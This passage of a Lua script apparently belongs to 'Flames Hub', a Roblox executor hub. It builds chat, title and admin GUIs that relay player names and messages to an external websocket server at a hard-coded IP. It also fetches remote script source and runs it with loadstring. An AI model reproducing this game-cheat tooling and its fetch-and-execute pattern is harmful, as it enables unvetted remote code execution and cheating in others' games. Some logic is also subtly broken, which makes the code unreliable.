            getgenv().add_msg(game.Players.LocalPlayer.Name, msg, name)

            local ws = getgenv().ws_conn
            if ws then
               pcall(function()
                  ws:Send(HttpService:JSONEncode({
                     type = "pm",
                     to   = name,
                     text = msg
                  }))
               end)
            end
            return true
         end
      end

      box.FocusLost:Connect(function(enter)
         if not enter or box.Text == "" then return end

         local text = box.Text:gsub("%c", ""):match("^%s*(.-)%s*$")
         box.Text = ""

         if handle_command(text) then return end
         if getgenv().Send_Main_Alert then
            pcall(function()
               getgenv().Send_Main_Alert(game.Players.LocalPlayer, text)
            end)
         end

         local ws = getgenv().ws_conn
         if ws then
            pcall(function()
               ws:Send(HttpService:JSONEncode({
                  type   = "message",
                  server = game.JobId,
                  user   = game.Players.LocalPlayer.Name,
                  text   = text
               }))
            end)
         end
      end)

      getgenv().chat_ui = gui
      return gui
   end

   if not getgenv().chat_ui then
      pcall(getgenv().create_chat_ui)
   end

   getgenv().connect_chat()
   wait(0.5)
   pcall(function()
      getgenv().add_msg("SYSTEM",
         "Type /w Player msg to PM | /clear to clear chat | Welcome!",
         "Global", true)
   end)

   getgenv().toggle_chat = function(state)
      if state == nil then state = not getgenv().chat_visible end
      local ui = getgenv().chat_ui or getgenv().create_chat_ui()
      getgenv().chat_visible = state
      ui.Enabled = state

      if state then
         getgenv().connect_chat()
      else
         getgenv().chat_reconnecting = false
         cleanup_socket()
      end
   end

   getgenv().set_chat_visible = function(state)
      local ui = getgenv().chat_ui or getgenv().create_chat_ui()
      getgenv().chat_visible = state
      ui.Enabled = state
   end
   wait(0.5)
   if getgenv().add_msg and typeof(getgenv().add_msg) == "function" then
      pcall(function() getgenv().add_msg("SYSTEM", "Type /w Player to Private Chat with them | /clear to clear all current chats | welcome, feel free to say what ever you want.", "Global") end)
   end

   -- [[ might add it back, it depends. ]] --
   --[[if ws_connect and (type(ws_connect) == "function" or typeof(ws_connect) == "function") then -- proper PROPER checking, come on now.
      local rebuild_titles
      g.player_heads = g.player_heads or {}
      g.humanoid_cons = g.humanoid_cons or {}
      g.ancestry_cons = g.ancestry_cons or {}
      g.title_system_online = g.title_system_online or false
      g.GLOBAL_TITLES = g.GLOBAL_TITLES or {}
      g.Settings = g.Settings or {
         enabled = true,
         hide_own = false,
         hide_others = false,
         title_text = "Flames Hub | Client",
         bg_color = {255,85,0}
      }

      local settings_file = "flameshub_titles.json"

      if isfile and readfile and isfile(settings_file) then
         pcall(function()
            local data = HttpService:JSONDecode(readfile(settings_file))
            for k,v in pairs(data) do
               g.Settings[k] = v
            end
         end)
      end

      local function save_settings()
         if writefile then
            writefile(settings_file,HttpService:JSONEncode(g.Settings))
         end
      end

      local allowed_colors = {
         {255,85,0},{255,0,0},{0,170,255},{0,200,120},
         {255,255,255},{180,0,255},{255,215,0},{255,105,180},
         {0,255,200},{120,120,255},{255,140,0},{0,180,90}
      }

      local function pick_color()
         return allowed_colors[math.random(1,#allowed_colors)]
      end

      local function clear_title_for(plr)
         local head = g.player_heads[plr]
         if head then
            local bb = head:FindFirstChild("flameshub_title_billboard")
            if bb then bb:Destroy() end
         end
      end

      local function build_title_for(plr,data)
         local function get_live_head(plr)
            local char = plr.Character
            if not char then return end
            return char:FindFirstChild("Head")
         end
         wait()
         local head = get_live_head(plr)
         if not head or not head:IsDescendantOf(workspace) then return end
         if plr.UserId == 10483028410 or plr.UserId == 7712000520 then return end

         local bg = head:FindFirstChild("flameshub_title_billboard")
         if not bg then
            bg = Instance.new("BillboardGui")
            bg.Name = "flameshub_title_billboard"
            bg.Adornee = head
            bg.Size = UDim2.new(0,250,0,50)
            bg.StudsOffset = Vector3.new(0,2.6,0)
            bg.AlwaysOnTop = true
            bg.Parent = head

            local frame = Instance.new("Frame")
            frame.Name = "bg"
            frame.Size = UDim2.new(1,0,1,0)
            frame.Parent = bg
            Instance.new("UICorner",frame).CornerRadius = UDim.new(0,8)

            local label = Instance.new("TextLabel")
            label.Name = "label"
            label.Size = UDim2.new(1,-10,1,-10)
            label.Position = UDim2.fromOffset(5,5)
            label.BackgroundTransparency = 1
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.TextColor3 = Color3.new(0,0,0)
            label.Parent = frame
         end

         local frame = bg.bg
         local label = frame.label
         frame.BackgroundColor3 = Color3.fromRGB(unpack(data.color or g.Settings.bg_color))
         label.Text = data.title or g.Settings.title_text
      end

      g._rebuild_pending = false

      local function request_rebuild()
         if g._rebuild_pending then return end
         g._rebuild_pending = true

         task.delay(0.15,function()
            g._rebuild_pending = false
            rebuild_titles()
         end)
      end

      rebuild_titles = function()
         if not g.title_system_online then return end
         if not g.Settings.enabled then return end

         for _,plr in ipairs(Players:GetPlayers()) do
            if plr == LocalPlayer and g.Settings.hide_own then
               clear_title_for(plr)
            end

            if plr ~= LocalPlayer and g.Settings.hide_others then
               clear_title_for(plr)
            end

            local char = plr.Character
            local head = char and char:FindFirstChild("Head")

            if not head or not head:IsDescendantOf(workspace) then
               clear_title_for(plr)
            end

            local data = g.GLOBAL_TITLES[plr.UserId]

            if data then
               build_title_for(plr,data)
            else
               clear_title_for(plr)
            end
         end
      end

      g.clear_player = function(plr)
         clear_title_for(plr)

         if g.humanoid_cons[plr] then
            g.humanoid_cons[plr]:Disconnect()
            g.humanoid_cons[plr] = nil
         end

         if g.ancestry_cons[plr] then
            g.ancestry_cons[plr]:Disconnect()
            g.ancestry_cons[plr] = nil
         end
      end

      g.watch_character = function(plr,char)
         local hum = char:WaitForChild("Humanoid",5)
         local head = char:WaitForChild("Head",5)

         if not hum or not head then return end

         request_rebuild()

         if g.humanoid_cons[plr] then g.humanoid_cons[plr]:Disconnect() end
         g.humanoid_cons[plr] = hum.Died:Connect(function()
            task.wait(.2)
            request_rebuild()
         end)

         if g.ancestry_cons[plr] then g.ancestry_cons[plr]:Disconnect() end
         g.ancestry_cons[plr] = char.Destroying:Connect(function()
            task.wait(.2)
            request_rebuild()
         end)
      end

      g.track_player = function(plr)
         g._tracking = g._tracking or {}
         if g._tracking[plr] then return end
         g._tracking[plr] = true

         local function start(char)
            task.wait()
            g.watch_character(plr,char)
         end

         if plr.Character then
            start(plr.Character)
         end

         plr.CharacterAdded:Connect(start)
      end

      task.defer(function()
         for _,plr in ipairs(Players:GetPlayers()) do
            g.track_player(plr)
         end

         Players.PlayerAdded:Connect(g.track_player)
         Players.PlayerRemoving:Connect(g.clear_player)
      end)

      task.delay(0.3,function()
         g.title_system_online = true
         request_rebuild()
      end)

      g.title_system_online = g.title_system_online ~= false
      g.title_socket = g.title_socket or nil
      g.title_offline_notified = g.title_offline_notified or false

      local function notify_offline()
         if g.title_offline_notified then return end
         g.title_offline_notified = true
         if getgenv().notify then
            getgenv().notify("Error", "Title server offline, if you see this, contact me ASAP (immediately), the script will not load.", 30)
         end
      end

      local function websocket_function_not_supported()
         if getgenv().notify then
            getgenv().notify("Error", "Your executor does not support WebSocket (you will not have a Title neither will anyone else on YOUR side).", 20)
         end
      end

      local function try_connect_titles()
         if not ws_connect then
            g.title_system_online = false
            websocket_function_not_supported()
            return false
         end

         local ok, sock = pcall(function()
            return ws_connect("ws://104.200.17.83:8080")
         end)

         if not ok or not sock then
            g.title_system_online = false
            notify_offline()
            return false
         end

         g.title_socket = sock
         g.title_system_online = true
         g.title_offline_notified = false
         return true
      end

      g.titles_gui_minimized = g.titles_gui_minimized or false
      g.title_editing_GUI = function()
         if CoreGui:FindFirstChild("flameshubtitlesgui") and CoreGui:FindFirstChild("flameshubtitlesgui"):IsA("ScreenGui") then
            CoreGui.flameshubtitlesgui.Enabled = true
            return
         end

         if not g.title_socket then
            if not try_connect_titles() then
               return 
            end

            pcall(function()
               g.title_socket:Send(HttpService:JSONEncode({
                  t="join",
                  userid=LocalPlayer.UserId,
                  name=LocalPlayer.Name,
                  title=g.Settings.title_text,
                  color=g.Settings.bg_color
               }))
            end)

            g.GLOBAL_TITLES[LocalPlayer.UserId] = {
               userid = LocalPlayer.UserId,
               name = LocalPlayer.Name,
               title = g.Settings.title_text,
               color = g.Settings.bg_color
            }
            request_rebuild()

            task.spawn(function()
               while g.title_socket and g.title_system_online do
                  pcall(function()
                     g.title_socket:Send(HttpService:JSONEncode({t="hb",userid=LocalPlayer.UserId}))
                  end)
                  task.wait(12)
               end
            end)
            g.title_socket.OnMessage:Connect(function(msg)
               local data = HttpService:JSONDecode(msg)

               if data.t == "sync" then
                  g.GLOBAL_TITLES = {}
                  for _,v in ipairs(data.list) do
                     g.GLOBAL_TITLES[v.userid] = v
                  end
                  request_rebuild()
                  return
               end

               if data.t == "add" then
                  g.GLOBAL_TITLES[data.userid] = {
                     userid = data.userid,
                     name = data.name,
                     title = data.title,
                     color = data.color
                  }
                  request_rebuild()
                  return
               end

               if data.t == "update" then
                  local entry = g.GLOBAL_TITLES[data.userid]
                  if entry then
                     entry.title = data.title
                     entry.color = data.color
                     request_rebuild()
                  end
                  return
               end

               if data.t == "remove" then
                  g.GLOBAL_TITLES[data.userid] = nil
                  request_rebuild()
                  return
               end
            end)
         end

         local function toggle_text(base, state)
            return base .. ": " .. (state and "ON" or "OFF")
         end

         local flames_hub_titles_main_gui = Instance.new("ScreenGui")
         flames_hub_titles_main_gui.Name = "flameshubtitlesgui"
         flames_hub_titles_main_gui.ResetOnSpawn = false
         flames_hub_titles_main_gui.Parent = CoreGui
         while not flames_hub_titles_main_gui or not flames_hub_titles_main_gui.Parent do
            getgenv().heartbeat_wait_function(3)
         end

         local expanded_size = UDim2.fromOffset(520,340)
         local minimized_size = UDim2.fromOffset(520,40)
         local panel = Instance.new("Frame")
         panel.Size = g.titles_gui_minimized and minimized_size or expanded_size
         panel.Position = UDim2.fromScale(0.98,0.06)
         panel.AnchorPoint = Vector2.new(1,0)
         panel.BackgroundColor3 = Color3.fromRGB(28,28,28)
         panel.Parent = flames_hub_titles_main_gui
         Instance.new("UICorner",panel).CornerRadius = UDim.new(0,14)
         getgenv().notify("Info", "Waiting for Title GUI Frame to load properly...", 4.9)
         while not panel or not panel.Parent do
            getgenv().heartbeat_wait_function(3)
         end

         if panel and panel:IsA("Frame") and panel.Parent.ClassName == "ScreenGui" then
            getgenv().notify("Success", "Title GUI Frame has loaded properly.", 3)
         else
            getgenv().notify("Error", "Title GUI Frame did not load correctly.", 5)
         end
         notify("Info", "Creating drag for Title GUI Frame...", 0.6)
         wait(0.5)
         dragify(panel)

         local header = Instance.new("TextLabel")
         header.Size = UDim2.new(1,0,0,40)
         header.BackgroundTransparency = 1
         header.Text = "Flames Hub | Settings"
         header.Font = Enum.Font.GothamBold
         header.TextScaled = true
         header.TextColor3 = Color3.new(1,1,1)
         header.Parent = panel

         local function header_btn(txt,x)
            local b = Instance.new("TextButton")
            b.Size = UDim2.fromOffset(26,26)
            b.Position = UDim2.fromOffset(x,7)
            b.Text = txt
            b.Font = Enum.Font.GothamBold
            b.TextScaled = true
            b.TextColor3 = Color3.new(1,1,1)
            b.BackgroundColor3 = Color3.fromRGB(70,70,70)
            b.Parent = panel
            Instance.new("UICorner",b).CornerRadius = UDim.new(0,6)
            return b
         end

         local minimize = header_btn(g.titles_gui_minimized and "+" or "-",panel.Size.X.Offset-68)
         local close = header_btn("X",panel.Size.X.Offset-34)

         local body = Instance.new("Frame")
         body.Position = UDim2.fromOffset(0,40)
         body.Size = UDim2.new(1,0,1,-40)
         body.BackgroundTransparency = 1
         body.Parent = panel

         minimize.MouseButton1Click:Connect(function()
            g.titles_gui_minimized = not g.titles_gui_minimized
            body.Visible = not g.titles_gui_minimized
            minimize.Text = g.titles_gui_minimized and "+" or "-"
            panel:TweenSize(
               g.titles_gui_minimized and minimized_size or expanded_size,
               Enum.EasingDirection.Out,
               Enum.EasingStyle.Quad,
               0.2,
               true
            )
         end)

         close.MouseButton1Click:Connect(function()
            for i = 1, 30 do
               local ok = pcall(function()
                  local frame = flames_hub_titles_main_gui:FindFirstChildOfClass("Frame")
                  if frame then
                     frame.Visible = false
                  end
               end)

               if ok then
                  local frame = flames_hub_titles_main_gui:FindFirstChildOfClass("Frame")
                  if frame and frame.Visible == false then
                     break
                  end
               end

               if getgenv().heartbeat_wait_function then
                  getgenv().heartbeat_wait_function()
               else
                  task.wait()
               end
            end
         end)

         local function make_btn(text,y)
            local b = Instance.new("TextButton")
            b.Size = UDim2.fromOffset(496,34)
            b.Position = UDim2.fromOffset(12,y)
            b.Text = text
            b.Font = Enum.Font.GothamBold
            b.TextScaled = true
            b.TextColor3 = Color3.new(1,1,1)
            b.BackgroundColor3 = Color3.fromRGB(65,65,65)
            b.Parent = body
            Instance.new("UICorner",b).CornerRadius = UDim.new(0,9)
            return b
         end

         local box = Instance.new("TextBox")
         box.Name = "TitleTextInputBox"
         box.Size = UDim2.fromOffset(496,34)
         box.Position = UDim2.fromOffset(12,10)
         box.Text = g.Settings.title_text
         box.Font = Enum.Font.Gotham
         box.TextScaled = true
         box.ClearTextOnFocus = false
         box.TextColor3 = Color3.new(1,1,1)
         box.BackgroundColor3 = Color3.fromRGB(55,55,55)
         box.Parent = body
         Instance.new("UICorner",box).CornerRadius = UDim.new(0,9)

         local random_btn = make_btn("Randomize Background Color",60)
         local apply_btn = make_btn("Apply Title (Global)",110)
         local hide_all = make_btn(toggle_text("Hide All Titles", not g.Settings.enabled),160)
         local hide_own = make_btn(toggle_text("Hide Own Title", g.Settings.hide_own),210)
         local hide_others = make_btn(toggle_text("Hide Other Titles", g.Settings.hide_others),260)

         random_btn.MouseButton1Click:Connect(function()
            g.Settings.bg_color = pick_color()
            save_settings()
            request_rebuild()
         end)

         apply_btn.MouseButton1Click:Connect(function()
            local txt = tostring(box.Text):sub(1,48)
            if txt=="" then return end
            g.Settings.title_text = txt
            save_settings()
            pcall(function()
               g.title_socket:Send(HttpService:JSONEncode({
                  t="update",
                  userid=LocalPlayer.UserId,
                  name=LocalPlayer.Name,
                  title=txt,
                  color=g.Settings.bg_color
               }))
            end)
         end)

         hide_all.MouseButton1Click:Connect(function()
            g.Settings.enabled = not g.Settings.enabled
            hide_all.Text = toggle_text("Hide All Titles", not g.Settings.enabled)
            save_settings()
            request_rebuild()
         end)

         hide_own.MouseButton1Click:Connect(function()
            g.Settings.hide_own = not g.Settings.hide_own
            hide_own.Text = toggle_text("Hide Own Title", g.Settings.hide_own)
            save_settings()
            request_rebuild()
         end)

         hide_others.MouseButton1Click:Connect(function()
            g.Settings.hide_others = not g.Settings.hide_others
            hide_others.Text = toggle_text("Hide Other Titles", g.Settings.hide_others)
            save_settings()
            request_rebuild()
         end)
      end
      fw(0.2)
      g.title_editing_GUI()
      while not CoreGui:FindFirstChild("flameshubtitlesgui") do
         task.wait(3)
      end

      if not getgenv().FlamesHub_Auto_Reconnector_Constructor_Global_Loop then
         task.spawn(function()
            while true do
               if not g.title_system_online then
                  try_connect_titles()
               end
               task.wait(10)
            end
         end)

         getgenv().FlamesHub_Auto_Reconnector_Constructor_Global_Loop = true
      end

      for _,plr in ipairs(Players:GetPlayers()) do
         task.spawn(function()
            local char = plr.Character
            if not char then
               char = plr.CharacterAdded:Wait()
            end
            watch_character(plr, char)
         end)
      end

      if not getgenv().PlayerAdded_Connection_For_Watch_Char_Flames_Hub_Title_System then
         getgenv().PlayerAdded_Connection_For_Watch_Char_Flames_Hub_Title_System = true

         Players.PlayerAdded:Connect(function(plr)
            task.spawn(function()
               local char = plr.Character
               if not char then
                  char = plr.CharacterAdded:Wait()
               end
               watch_character(plr, char)
            end)
         end)
      end

      if not getgenv().FlamesHub_Title_System_Char_Added_Connections_Established then
         getgenv().FlamesHub_Title_System_Char_Added_Connections_Established = true

         LocalPlayer.CharacterAdded:Connect(function()
            fw(0.2)
            request_rebuild()
         end)

         for _,plr in ipairs(Players:GetPlayers()) do
            plr.CharacterAdded:Connect(function()
               fw(0.2)
               request_rebuild()
            end)
         end

         Players.PlayerAdded:Connect(function(plr)
            plr.CharacterAdded:Connect(function()
               fw(0.2)
               request_rebuild()
            end)
         end)
      end

      if not CoreGui:FindFirstChild("flameshubtitlesgui"):FindFirstChild("TitleGUIToggleButton") then
         local toggle = Instance.new("TextButton")
         toggle.Name = "TitleGUIToggleButton"
         toggle.Size = UDim2.new(0, 50, 0, 40)
         toggle.Position = getgenv().UserInputService.TouchEnabled and UDim2.new(0.96, 0, 0.06, 0) or UDim2.new(0.899999976, 0, -0.0299999993, 0)
         toggle.AnchorPoint = Vector2.new(1,0.5)
         toggle.Text = "T"
         toggle.Font = Enum.Font.GothamBold
         toggle.TextScaled = true
         toggle.TextColor3 = Color3.fromRGB(0,0,0)
         toggle.BackgroundColor3 = Color3.fromRGB(255,85,0)
         toggle.Parent = CoreGui:FindFirstChild("flameshubtitlesgui")
         Instance.new("UICorner",toggle).CornerRadius = UDim.new(1,0)
         fw(0.2)
         while not toggle or not toggle.Parent do
            getgenv().heartbeat_wait_function(5)
         end
         notify("Info", "Waiting for 'flameshubtitlesgui' to load.", 5.1)
         while not CoreGui:FindFirstChild("flameshubtitlesgui") do
            getgenv().heartbeat_wait_function(3.5)
         end
         wait(0.5)
         if toggle then
            dragify(toggle)
         end
         toggle.MouseButton1Click:Connect(function()
            local attempts = 0
            local max_attempts = 50

            while attempts < max_attempts do
               attempts = attempts + 1

               local gui = CoreGui:FindFirstChild("flameshubtitlesgui")
               if gui then
                  local frame = gui:FindFirstChildOfClass("Frame")
                  if frame then
                     frame.Visible = not frame.Visible
                     return
                  end
               end

               getgenv().heartbeat_wait_function(0.20)
            end
         end)
      end
      wait(0.5)
      if CoreGui:FindFirstChild("flameshubtitlesgui") and CoreGui:FindFirstChild("flameshubtitlesgui"):FindFirstChildOfClass("Frame") then
         CoreGui:FindFirstChild("flameshubtitlesgui"):FindFirstChildOfClass("Frame").Visible = true
      end
   end--]]
   fw(0.2)
   getgenv().get_active_title_users = function()
      local out = {}
      for _,plr in ipairs(Players:GetPlayers()) do
         local data = g.GLOBAL_TITLES[plr.UserId]
         if data then
            out[#out+1] = data
         end
      end
      return out
   end

   getgenv().is_streamed_in = function(plr)
      if not plr or not plr:IsA("Player") then
         return false
      end

      local char = plr.Character
      if not char then
         return false
      end

      local root = char:FindFirstChild("HumanoidRootPart")
      if not root then
         return false
      end

      return root:IsDescendantOf(workspace)
   end

   getgenv().is_streamed_out_checker = function(char)
      if not char or not char:IsA("Player") then
         return false
      end

      char = char or char.Character
      if not char then
         return false
      end

      local root = char:FindFirstChild("HumanoidRootPart") or char:WaitForChild("HumanoidRootPart", 1)
      if not root then
         return false
      end

      if not root:IsDescendantOf(workspace) then
         return false
      end

      return true
   end

   getgenv().has_title = function(plr)
      return g.GLOBAL_TITLES[plr.UserId] ~= nil
   end

   getgenv().administrator_flames_hub_user_GUI = function()
      if CoreGui:FindFirstChild("flameshub_title_users_gui") and CoreGui:FindFirstChild("flameshub_title_users_gui"):IsA("ScreenGui") then
         CoreGui.flameshub_title_users_gui.Enabled = true
         return 
      end
      fw(0.1)
      local gui = Instance.new("ScreenGui")
      gui.Name = "flameshub_title_users_gui"
      gui.ResetOnSpawn = false
      gui.Parent = CoreGui

      local panel = Instance.new("Frame")
      panel.Size = UDim2.fromOffset(420,360)
      panel.Position = UDim2.fromScale(0.5,0.5)
      panel.AnchorPoint = Vector2.new(0.5,0.5)
      panel.BackgroundColor3 = Color3.fromRGB(25,25,25)
      panel.Parent = gui
      Instance.new("UICorner",panel).CornerRadius = UDim.new(0,14)

      dragify(panel)

      local header = Instance.new("Frame")
      header.Size = UDim2.new(1,0,0,40)
      header.BackgroundTransparency = 1
      header.Parent = panel

      local title = Instance.new("TextLabel")
      title.Size = UDim2.new(1,-90,1,0)
      title.Position = UDim2.fromOffset(12,0)
      title.BackgroundTransparency = 1
      title.Text = "Flames Hub | Admin Panel"
      title.Font = Enum.Font.GothamBold
      title.TextScaled = true
      title.TextXAlignment = Enum.TextXAlignment.Left
      title.TextColor3 = Color3.new(1,1,1)
      title.Parent = header

      local function header_btn(txt,x)
         local b = Instance.new("TextButton")
         b.Size = UDim2.fromOffset(26,26)
         b.Position = UDim2.fromOffset(x,7)
         b.Text = txt
         b.Font = Enum.Font.GothamBold
         b.TextScaled = true
         b.TextColor3 = Color3.new(1,1,1)
         b.BackgroundColor3 = Color3.fromRGB(70,70,70)
         b.Parent = header
         Instance.new("UICorner",b).CornerRadius = UDim.new(1,0)
         return b
      end

      local minimized = false
      local body_size = panel.Size
      local minimized_size = UDim2.fromOffset(420,40)
      local minimize = header_btn("-",panel.Size.X.Offset-68)
      local close = header_btn("X",panel.Size.X.Offset-34)

      local body = Instance.new("Frame")
      body.Position = UDim2.fromOffset(0,40)
      body.Size = UDim2.new(1,0,1,-40)
      body.BackgroundTransparency = 1
      body.Parent = panel

      local list = Instance.new("ScrollingFrame")
      list.Size = UDim2.new(1,-20,1,-20)
      list.Position = UDim2.fromOffset(10,10)
      list.CanvasSize = UDim2.new(0,0,0,0)
      list.ScrollBarImageTransparency = 0.4
      list.ScrollBarThickness = 6
      list.BackgroundTransparency = 1
      list.Parent = body

      local layout = Instance.new("UIListLayout")
      layout.Padding = UDim.new(0,8)
      layout.Parent = list

      layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
         list.CanvasSize = UDim2.new(0,0,0,layout.AbsoluteContentSize.Y+10)
      end)

      local function make_entry(text)
         local f = Instance.new("Frame")
         f.Size = UDim2.new(1,-6,0,36)
         f.BackgroundColor3 = Color3.fromRGB(45,45,45)
         Instance.new("UICorner",f).CornerRadius = UDim.new(0,8)

         local l = Instance.new("TextLabel")
         l.Size = UDim2.new(1,-10,1,0)
         l.Position = UDim2.fromOffset(5,0)
         l.BackgroundTransparency = 1
         l.Text = text
         l.Font = Enum.Font.Gotham
         l.TextScaled = true
         l.TextXAlignment = Enum.TextXAlignment.Left
         l.TextColor3 = Color3.new(1,1,1)
         l.Parent = f

         return f
      end

      local function rebuild()
         list:ClearAllChildren()
         layout.Parent = list

         for userid,data in pairs(g.GLOBAL_TITLES or {}) do
            local username = data.name or ("UserId "..tostring(userid))
            local display = username

            local plr = Players:GetPlayerByUserId(userid)
            if plr then
               display = plr.DisplayName
            end

            local text = string.format("%s (@%s)", username, display)
            local entry = make_entry(text)
            entry.Parent = list
         end
      end

      local old_rebuild = rebuild_titles
      rebuild_titles = function(...)
         old_rebuild(...)
         if gui and gui.Parent then
            pcall(rebuild)
         end
      end

      minimize.MouseButton1Click:Connect(function()
         minimized = not minimized
         body.Visible = not minimized
         minimize.Text = minimized and "+" or "-"
         panel:TweenSize(
            minimized and minimized_size or body_size,
            Enum.EasingDirection.Out,
            Enum.EasingStyle.Quad,
            0.2,
            true
         )
      end)

      close.MouseButton1Click:Connect(function()
         gui.Enabled = false
      end)
   end

   getgenv().LoadPerformanceStatsGUI = function()
      if getgenv().performance_stats then
         notify("Info", "Performance Statistics GUI is already loaded.", 5)
         return
      end

      notify("Info", "Loading Performance Statistics GUI...", 5)

      local success, err = pcall(function()
         local src = get_script_text("grab_file_performance")
         if src == "" then
            notify("Error", "no valid source", 5)
         end
         loadstring(src)()
      end)

      if not success then
         notify("Error", "Failed to load Performance Statistics GUI: "..tostring(err), 8)
         return
      end

      local timeout = 10
      repeat
         task.wait(0.5)
         timeout = timeout - 0.5
      until getgenv().performance_stats or timeout <= 0

      if getgenv().performance_stats then
         notify("Success", "Loaded Performance Statistics GUI.", 5)
      else
         notify("Warning", "Failed to confirm Performance Statistics GUI load.", 8)
      end
   end

   getgenv().fileName = "LifeTogether_Admin_Configuration.json"
   -- [[ Now we have an allowed Prefix system, so we can correctly modify your Prefix if it's broken. ]] --
   getgenv().Allowed_Prefixes = {
      "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "=", "_", "+", ",",
      ".", "/", ">", "<", "?", "~", "`", "}", "{", "[", "]", ":", "1", "2", "3", "4", "5", "·", "•", "∙", "⋅", "£"
   }
   getgenv().isAllowedPrefix = function(prefix)
      for _, p in ipairs(Allowed_Prefixes) do
         if prefix == p then
            return true
         end
      end
      return false
   end

   -- [[ Now checks if your Prefix is allowed or not, so we can always check if it's broken or not. ]] --

   getgenv().loadPrefix = getgenv().loadPrefix or function()
      local defaultPrefix = "-"
      local data = { prefix = defaultPrefix }

      if isfile and isfile(fileName) then
         local success, decoded = pcall(function()
            return HttpService:JSONDecode(readfile(fileName))
         end)

         if success and type(decoded) == "table" and decoded.prefix then
            local prefix = tostring(decoded.prefix)
            if prefix == "symbol" or not isAllowedPrefix(prefix) then
               -- [[ Fix the users Prefix if we found that it's broken. ]] --
               notify("Info", "We've automatically modified your Prefix, it was broken or not an allowed Prefix.", 7)
               decoded.prefix = defaultPrefix
               writefile(fileName, HttpService:JSONEncode(decoded))
               return defaultPrefix
            else
               -- [[ Otherwise return the correct Prefix and continue. ]] --
               return prefix
            end
         end
      end

      writefile(fileName, HttpService:JSONEncode(data))
      return defaultPrefix
   end

   if not getgenv().make_stroke then
      getgenv().make_stroke = function(obj, thickness, trans)
         local ui_stroke = Instance.new("UIStroke")
         ui_stroke.Thickness = tonumber(thickness) or 1
         ui_stroke.Transparency = tonumber(trans) or 0.3
         ui_stroke.Parent = obj
      end
   end

   getgenv().Command_Assistance_GUI_Menu_Loaded = getgenv().Command_Assistance_GUI_Menu_Loaded or false

   getgenv().command_assist_toggle = function(state)
      local gui = getgenv().CommandHelper_MainScreenGui
      if gui then
         gui.Enabled = state
         getgenv().Command_Assistance_GUI_Menu_Loaded = state
      end
   end

   if not getgenv().cmd_helper_close_signal then
      getgenv().cmd_helper_close_signal = Instance.new("BindableEvent")
   end

   if not getgenv().cmd_helper_close_task then
      getgenv().cmd_helper_close_task = task.spawn(function()
         while true do
            getgenv().cmd_helper_close_signal.Event:Wait()
            local gui = getgenv().CommandHelper_MainScreenGui
            if gui then
               gui.Enabled = false
            end
            getgenv().Command_Assistance_GUI_Menu_Loaded = false
         end
      end)
   end

   getgenv().CommandAssistanceGUI = function()
      if getgenv().CommandHelper_MainScreenGui then
         getgenv().command_assist_toggle(true)
         return
      end

      local gui = Instance.new("ScreenGui")
      gui.Name = "Cmd_Helper_GUI"
      gui.ResetOnSpawn = false
      gui.Enabled = false
      gui.Parent = getgenv().PlayerGui

      if gui and gui:IsA("ScreenGui") then
         pcall(function() getgenv().CommandHelper_MainScreenGui = gui end)
      end
      fw(0.1)
      getgenv().Command_Assistance_GUI_Menu_Loaded = true
      local commands_helper_frame_from_screen_gui_main = Instance.new("Frame")
      commands_helper_frame_from_screen_gui_main.Size = UDim2.new(0,450,0,240)
      commands_helper_frame_from_screen_gui_main.Position = UDim2.new(0.5,-225,0.5,-120)
      commands_helper_frame_from_screen_gui_main.BackgroundColor3 = Color3.fromRGB(25,25,25)
      commands_helper_frame_from_screen_gui_main.BorderSizePixel = 0
      commands_helper_frame_from_screen_gui_main.Active = true
      commands_helper_frame_from_screen_gui_main.Parent = gui
      while not commands_helper_frame_from_screen_gui_main or not commands_helper_frame_from_screen_gui_main.Parent do
         getgenv().heartbeat_wait_function(3)
      end
      wait(0.3)
      dragify(commands_helper_frame_from_screen_gui_main)

      local title = Instance.new("TextLabel")
      title.Size = UDim2.new(1,-40,0,35)
      title.BackgroundTransparency = 1
      title.Text = "How to use commands (for dumb asses):"
      title.TextColor3 = Color3.fromRGB(255,255,255)
      title.TextScaled = true
      title.Font = Enum.Font.SourceSansBold
      title.Parent = commands_helper_frame_from_screen_gui_main
      make_round(title, 8)

      local closeBtn = Instance.new("TextButton")
      closeBtn.Size = UDim2.new(0,35,0,35)
      closeBtn.Position = UDim2.new(1,-35,0,0)
      closeBtn.BackgroundColor3 = Color3.fromRGB(45,45,45)
      closeBtn.Text = "X"
      closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
      closeBtn.Font = Enum.Font.SourceSansBold
      closeBtn.TextScaled = true
      closeBtn.Parent = commands_helper_frame_from_screen_gui_main

      make_round(closeBtn, 8)

      local content = Instance.new("TextLabel")
      content.Size = UDim2.new(1,-20,1,-65)
      content.Position = UDim2.new(0,10,0,40)
      content.BackgroundTransparency = 1
      content.TextColor3 = Color3.fromRGB(255,255,255)
      content.TextWrapped = true
      content.TextXAlignment = Enum.TextXAlignment.Left
      content.TextYAlignment = Enum.TextYAlignment.Top
      content.Font = Enum.Font.SourceSans
      content.TextSize = 20
      content.Parent = commands_helper_frame_from_screen_gui_main

      make_round(content, 8)

      local prefix = loadPrefix()
      content.Text = table.concat({
         "1. Your current prefix is: ", tostring(prefix),
         "\n2. So just do: ", tostring(prefix), "cmds in chat",
         "\n3. Execute commands in chat with that Prefix."
      })

      local note = Instance.new("TextLabel")
      note.Size = UDim2.new(1,-20,0,20)
      note.Position = UDim2.new(0,10,1,-25)
      note.BackgroundTransparency = 1
      note.TextColor3 = Color3.fromRGB(230,230,230)
      note.Text = "If you know how to use commands, just close this."
      note.Font = Enum.Font.SourceSansItalic
      note.TextScaled = true
      note.TextXAlignment = Enum.TextXAlignment.Center
      note.Parent = commands_helper_frame_from_screen_gui_main

      closeBtn.MouseButton1Click:Connect(function()
         getgenv().cmd_helper_close_signal:Fire()
      end)
   end
   wait(0.5)
   if not getgenv().Has_Seen_Command_Helper_Already then
      while not getgenv().CommandAssistanceGUI do
         task.wait()
      end

      if not getgenv().Command_Assistance_GUI_Menu_Loaded then
         getgenv().CommandAssistanceGUI()
      end
      wait(0.3)
      if getgenv().CommandHelper_MainScreenGui and getgenv().CommandHelper_MainScreenGui:IsA("ScreenGui") then
         getgenv().CommandHelper_MainScreenGui.Enabled = true
      end
      fw(0.1)
      getgenv().Has_Seen_Command_Helper_Already = true
   end

   getgenv().find_module_s = function(module_name)
      if not module_name then
         return nil
      end

      local base = getgenv().Modules or getgenv().ReplicatedStorage:FindFirstChild("Modules", true)
      local Modules = require(base)
